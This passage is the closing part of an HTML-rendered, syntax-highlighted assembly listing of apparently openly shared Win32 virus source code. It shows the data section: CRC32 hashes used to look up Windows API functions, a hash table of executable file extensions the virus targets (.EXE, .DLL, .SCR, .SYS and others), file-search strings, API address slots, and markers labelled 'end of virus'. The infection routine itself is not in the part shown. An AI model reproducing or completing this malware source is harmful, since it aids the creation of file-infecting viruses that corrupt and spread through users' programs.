        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">08C892DDFh</span><span class="sc0">      </span><span class="sc1">;CreateFileA</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">096B2D96Ch</span><span class="sc0">      </span><span class="sc1">;CreateFileMappingA</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0797B49ECh</span><span class="sc0">      </span><span class="sc1">;MapViewOfFile</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">094524B42h</span><span class="sc0">      </span><span class="sc1">;UnmapViewOfFile</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">068624A9Dh</span><span class="sc0">      </span><span class="sc1">;CloseHandle</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0613FD7BAh</span><span class="sc0">      </span><span class="sc1">;GetTickCount</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">042F13D06h</span><span class="sc0">      </span><span class="sc1">;GetVersion</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0EBC6C18Bh</span><span class="sc0">      </span><span class="sc1">;GetCurrentDirectoryA</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0B2DBD7DCh</span><span class="sc0">      </span><span class="sc1">;SetCurrentDirectoryA</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">04134D1ADh</span><span class="sc0">      </span><span class="sc1">;LoadLibraryA</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0FFC97C1Fh</span><span class="sc0">      </span><span class="sc1">;GetProcAddress</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0AFDF191Fh</span><span class="sc0">      </span><span class="sc1">;FreeLibrary</span><span class="sc0">
</span><span class="sc5">crc32c</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">crc32s</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc0">

</span><span class="sc1">;file extension's CRC32's</span><span class="sc0">
</span><span class="sc5">file_extension_table</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">_ACM</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0AC705BF1h</span><span class="sc0">  </span><span class="sc1">; .ACM extension</span><span class="sc0">
</span><span class="sc5">_AX</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0629337BAh</span><span class="sc0">  </span><span class="sc1">; .AX extension</span><span class="sc0">
</span><span class="sc5">_CNV</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0A797CBB3h</span><span class="sc0">  </span><span class="sc1">; .CNV extension</span><span class="sc0">
</span><span class="sc5">_COM</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00F636A1Eh</span><span class="sc0">  </span><span class="sc1">; .COM extension</span><span class="sc0">
</span><span class="sc5">_CPL</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00102BF12h</span><span class="sc0">  </span><span class="sc1">; .CPL extension</span><span class="sc0">
</span><span class="sc5">_DLL</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">089E9DDBFh</span><span class="sc0">  </span><span class="sc1">; .DLL extension</span><span class="sc0">
</span><span class="sc5">_DRV</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">02F7CA91Eh</span><span class="sc0">  </span><span class="sc1">; .DRV extension</span><span class="sc0">
</span><span class="sc5">_EXE</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0FBB80A3Fh</span><span class="sc0">  </span><span class="sc1">; .EXE extension</span><span class="sc0">
</span><span class="sc5">_MPD</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">029044229h</span><span class="sc0">  </span><span class="sc1">; .MPD extension</span><span class="sc0">
</span><span class="sc5">_OCX</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">07B1ACAD6h</span><span class="sc0">  </span><span class="sc1">; .OCX extension</span><span class="sc0">
</span><span class="sc5">_PCI</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">020B9AE0Fh</span><span class="sc0">  </span><span class="sc1">; .PCI extension</span><span class="sc0">
</span><span class="sc5">_SCR</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">09B3ACA7Bh</span><span class="sc0">  </span><span class="sc1">; .SCR extension</span><span class="sc0">
</span><span class="sc5">_SYS</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">09390DD9Ch</span><span class="sc0">  </span><span class="sc1">; .SYS extension</span><span class="sc0">
</span><span class="sc5">_TSP</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">028FD3330h</span><span class="sc0">  </span><span class="sc1">; .TSP extension</span><span class="sc0">
</span><span class="sc5">_TLB</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">04773A7AEh</span><span class="sc0">  </span><span class="sc1">; .TLB extension</span><span class="sc0">
</span><span class="sc5">_VWP</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">085FD5367h</span><span class="sc0">  </span><span class="sc1">; .VWP extension</span><span class="sc0">
</span><span class="sc5">_WPC</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">059E16315h</span><span class="sc0">  </span><span class="sc1">; .WPC extension</span><span class="sc0">
</span><span class="sc5">file_extension_table_end</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">szCurDir</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc13">'\',00h         ; Null-terminated string that
</span><span class="sc5">szCurDir_</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'..'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">        </span><span class="sc1">; Null-terminated string that</span><span class="sc0">
                                        </span><span class="sc1">; specifies the path to the new</span><span class="sc0">
                                        </span><span class="sc1">; current directory</span><span class="sc0">
</span><span class="sc5">szFileName</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'*.*'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">       </span><span class="sc1">; Name of file to search for</span><span class="sc0">
</span><span class="sc5">end_virus</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; end of virus in file</span><span class="sc0">

</span><span class="sc5">a_apis</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc1">;API addresses</span><span class="sc0">
</span><span class="sc5">a_FindFirstFileA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">a_FindNextFileA</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">a_FindClose</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">a_SetFileAttributesA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">a_SetFileTime</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">a_CreateFileA</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">a_CreateFileMappingA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">a_MapViewOfFile</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">a_UnmapViewOfFile</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">a_CloseHandle</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">a_GetTickCount</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">a_GetVersion</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">a_GetCurrentDirectoryA</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">a_SetCurrentDirectoryA</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">a_LoadLibraryA</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">a_GetProcAddress</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">a_FreeLibrary</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">


</span><span class="sc5">cBuffer</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; Buffer for the current</span><span class="sc0">
                                            </span><span class="sc1">; directory string.</span><span class="sc0">
</span><span class="sc5">cBuffer_</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; Buffer for the current</span><span class="sc0">
                                            </span><span class="sc1">; directory string.</span><span class="sc0">
</span><span class="sc5">WFD</span><span class="sc0">     </span><span class="sc5">WIN32_FIND_DATA</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; WIN32_FIND_DATA</span><span class="sc0">
</span><span class="sc5">virtual_end</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc1">; end of virus in memory</span><span class="sc0">
</span><span class="sc5">exit_process</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc0">  </span><span class="sc1">;used by first gen. only</span><span class="sc0">


</span><span class="sc9">ends</span><span class="sc0">                    </span><span class="sc1">;end of .code section</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">Start</span><span class="sc0">               </span><span class="sc1">;end of virus</span><span class="sc0">
</span></div></body>
</html>
